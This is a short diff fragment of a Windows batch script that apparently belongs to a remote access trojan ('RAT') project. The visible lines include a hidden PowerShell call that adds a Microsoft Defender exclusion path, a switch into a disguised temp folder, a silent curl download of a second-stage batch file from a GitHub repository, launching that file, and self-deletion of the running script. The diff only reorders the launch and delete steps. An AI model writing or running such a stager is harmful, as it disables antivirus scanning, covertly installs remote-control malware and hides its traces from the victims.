@@ -29,5 +29,5 @@ powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath "$
 cd C:\Users\saif\AppData\Local\Temp\MicroWindows
 mkdir Logs
 curl https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -o secondary.bat --silent
-start "" secondary.bat
 del "%~f0"
+start "" secondary.bat
